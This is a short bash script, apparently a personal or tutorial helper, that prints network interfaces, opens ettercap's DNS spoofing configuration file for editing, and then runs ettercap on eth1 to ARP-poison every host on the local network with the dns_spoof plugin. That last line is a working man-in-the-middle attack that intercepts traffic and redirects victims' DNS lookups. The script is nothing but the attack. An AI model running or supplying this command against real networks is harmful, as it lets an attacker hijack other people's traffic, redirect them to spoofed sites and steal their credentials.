#!/bin/bash
ifconfig

leafpad /etc/ettercap/etter.dns

ettercap -Tqi eth1 -M arp:remote /// /// -P dns_spoof
